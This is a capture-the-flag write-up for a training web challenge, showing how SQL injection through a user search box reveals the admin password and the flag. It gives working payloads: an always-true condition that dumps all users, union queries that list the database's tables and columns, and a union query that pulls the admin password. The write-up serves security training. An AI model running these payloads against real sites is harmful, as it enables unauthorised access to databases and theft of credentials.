# [Kept In Secret](https://training.majorleaguecyber.org/challenges#Kept%20in%20Secret)

So we go ahead and register a user and login. We see the same search functionality.

This allows searching by username and we get back a table of: username, name, and description.

So the query probably looks like this:

`SELECT id,username,name,description FROM table WHERE username=$_GET["search"];`

So searching for `' or 1=1-- `, will return all users. And we see an `admin` user.

We want to get his password. So first, like the last challenge we need to do these steps:

1. Determine how many columns are being returned by this query: 3
2. Determine the type of each column(or at least find one that returns a string): 1st column
3. List all the tables: `' union select table_name,null,null from information_schema.tables-- `:
and we see one called `users`
4. List the columns for that table: 
`' union select column_name,null,null from information_schema.columns where table_name='users'-- `
And the columns are: id, username, password, name, description
5. Now we can get the admin password: 
`' union select password,null,null from users where username='admin'-- `

And there's our flag!

> flag{pa55w0rd5_ar3_b1g_s3cr3t5}
